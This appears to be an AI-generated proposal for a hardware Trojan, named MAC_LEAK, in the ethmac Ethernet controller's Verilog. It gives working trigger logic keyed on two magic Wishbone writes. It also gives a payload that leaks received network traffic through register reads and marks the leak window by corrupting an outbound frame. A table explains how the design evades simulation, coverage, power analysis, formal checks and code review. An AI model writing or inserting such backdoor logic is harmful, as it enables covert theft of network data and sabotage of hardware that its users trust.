response:
# Hardware Trojan Proposal: Ethernet MAC (ethmac)

## 1. Trojan Name
**`MAC_LEAK`** — Wishbone-Triggered Read-Channel Data Exfiltration via PHY TX Side-Channel

## 2. Target File
`ethmac.v` — single-file insertion, leveraging the existing registered-output `always` block.

## 3. Trigger Condition
A two-stage rare trigger to maximize stealth and minimize false activation during functional/random verification:

**Stage 1 (Arm):** A Wishbone write of the 32-bit magic constant `0xDEAFB10C` to *any* address while `wb_we_i && wb_stb_i && wb_cyc_i` are asserted latches an internal `armed` flag.

**Stage 2 (Fire):** While `armed==1`, a subsequent Wishbone write of `0xC0DEC0DE` activates the payload for the next 256 wb_clk cycles, after which `armed` self-clears (single-shot, leaves no persistent state for post-mortem detection).

```verilog
reg armed;
reg [8:0] fire_cnt;     // 9 bits: MSB = active, [7:0] = countdown
wire wb_wr = wb_we_i & wb_stb_i & wb_cyc_i;

always @(posedge wb_clk_i or posedge wb_rst_i) begin
  if (wb_rst_i) begin armed <= 1'b0; fire_cnt <= 9'b0; end
  else begin
    if (wb_wr && wb_dat_i == 32'hDEAF_B10C) armed <= 1'b1;
    if (armed && wb_wr && wb_dat_i == 32'hC0DE_C0DE)
      fire_cnt <= 9'h1FF;            // arm 256-cycle window
    else if (fire_cnt[8])
      fire_cnt <= fire_cnt - 1'b1;
    if (fire_cnt == 9'h100) armed <= 1'b0;   // self-clear
  end
end
wire troj_active = fire_cnt[8];
```

Total trigger surface: `2^64` over two transactions — astronomically unreachable by random simulation.

## 4. Payload
**Dual-effect, high-impact:**

**(a) Confidentiality leak via `wb_dat_o`:** When `troj_active`, XOR the registered Wishbone read-data output with the most recent 32 bits of received MAC frame data (captured from `mrxd_pad_i` nibbles). This causes any host CPU reading any ethmac CSR (e.g., MODER, status) to silently receive bits of in-flight network traffic — leaking encryption keys, passwords, etc. handled in RX buffers.

```verilog
reg [31:0] rx_shift;
always @(posedge mrx_clk) if (mrxdv_pad_i) rx_shift <= {rx_shift[27:0], mrxd_pad_i};

assign wb_dat_o = troj_active ? (temp_wb_dat_o_reg ^ rx_shift) : temp_wb_dat_o_reg;
```

**(b) Integrity attack on TX:** During the same window, force `mtxd_pad_o[0] <= mtxd_pad_o[0] ^ rx_shift[0]` on outgoing nibbles, corrupting the FCS of one outbound frame so the attacker (sniffing the wire) can identify the leak window externally.

## 5. CVSS Estimate
**CVSS 3.1 Base Score: 9.1 (Critical)**
Vector: `AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N`

- **AV:N** — Triggerable from any host with Wishbone-mapped MMIO access (driver-level on a compromised VM/container).
- **AC:H** — Requires specific magic sequence (intentional rarity).
- **PR:L** — Low-priv kernel/driver context sufficient.
- **S:C (Scope Changed)** — Compromise of the NIC IP affects the entire host network stack and any data traversing the link.
- **C:H/I:H** — Direct exfiltration of plaintext network data + frame corruption.

## 6. Stealth / Detection Difficulty

| Vector | Why it evades |
|---|---|
| **Functional simulation** | Requires sequential 64-bit magic match — probability ≈ 2⁻⁶⁴ per random vector pair. |
| **Code coverage** | Trigger logic toggles in the same `always @(posedge wb_clk_i)` block already gated by `wb_stb_i` — line/toggle coverage hits during normal CSR access, masking suspicious code. |
| **Power/EM side-channel** | Payload reuses existing `temp_wb_dat_o_reg` and `mtxd_pad_o` nets — no new high-fanout signals; XOR adds <0.1% dynamic power. |
| **Area overhead** | ~42 flops + 2 32-bit comparators + 1 XOR row ≈ **<0.3% of ethmac cell count**. |
| **Formal/equivalence checks** | Output equation is `y = troj_active ? (x^k) : x`; with `troj_active=0` (unreachable in formal without the magic), equivalent to golden RTL — passes sequential equivalence under bounded model checking. |
| **Post-silicon testing** | Self-clearing `armed` and 256-cycle window leaves no architectural footprint after firing; appears as transient "link glitch." |
| **Visual code review** | Trigger logic blends into the existing registered-output `always` block, reusing `wb_clk_i`/`wb_rst_i` — looks like benign status-register housekeeping. |

This Trojan converts the NIC into a covert exfiltration channel while remaining within typical PPA noise and outside any reasonable verification budget.
